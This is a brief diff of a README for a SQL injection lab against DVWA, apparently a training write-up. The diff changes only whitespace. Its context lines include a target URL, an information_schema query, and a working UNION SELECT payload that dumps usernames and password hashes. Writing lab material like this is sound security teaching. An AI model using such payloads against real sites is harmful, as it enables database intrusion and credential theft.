@@ -31,7 +31,6 @@ SQLi-Simulation-DVWA/<br/>
 ```http
 http://dvwa.structreuality.com/vulnerabilities/sqli/?id=#
 
-
 🔹 Steps Performed:
 Initial Request:
 
@@ -48,5 +47,4 @@ column_name from information_schema.columns
 Credential Dump:
 
 Retrieved usernames and password hashes:
-
 ' UNION SELECT CONCAT(user, ' ', avatar), password FROM users#
